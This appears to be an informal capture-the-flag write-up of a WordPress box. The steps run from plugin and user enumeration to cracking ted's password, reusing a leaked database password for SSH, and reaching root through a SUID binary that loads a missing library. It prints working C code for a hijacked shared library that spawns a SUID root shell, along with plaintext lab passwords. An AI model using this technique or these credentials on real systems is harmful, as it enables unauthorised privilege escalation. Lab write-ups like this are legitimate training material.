port 80 blog  
<img width="1475" height="611" alt="image" src="https://github.com/user-attachments/assets/5eced44d-77af-4638-a7ae-60ca9a2f3bdf" />

wpscan took too long but i found the plugins in the inspect  
<img width="1390" height="210" alt="image" src="https://github.com/user-attachments/assets/e3faf39d-f892-4565-8624-219713f2a3fd" />  
<img width="1327" height="452" alt="image" src="https://github.com/user-attachments/assets/acf5b068-683d-40f4-85a3-cdc04473796f" />

admin charlie ted and hashes
<img width="1531" height="152" alt="image" src="https://github.com/user-attachments/assets/f77dbf80-9c67-49a6-8974-bb74652f39d8" />  
<img width="1256" height="221" alt="image" src="https://github.com/user-attachments/assets/fad973ed-fc1e-459e-9cda-ee90d8f76cb9" />

took so long but i cracked teds password with john
okadamat17       (?)     

use ted credentials to ftp  
define( 'DB_USER', 'wpadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', 'rU)tJnTw5*ShDt4nOx' );

password works for charlie in ssh

wp-monitor has suidbit. init plugin function missing. so we write our own. /home/ted/.lib/libsecurity.so
<img width="499" height="197" alt="image" src="https://github.com/user-attachments/assets/33ee018c-5e8a-4ad5-8416-7ec2768e9809" />

C SHELL
#include <stdlib.h>
#include <unistd.h>

void init_plugin() {
    setuid(0);
    setgid(0);
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}

OR

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void init_plugin() {
    system("/bin/bash -p");
}

gcc -fPIC -shared lib.c -o libsecurity.so



then run wp-monitor for root  
<img width="624" height="108" alt="image" src="https://github.com/user-attachments/assets/a73a88f3-9cee-47ca-b90f-2bbe2ed23077" />

THIS WAS HARD
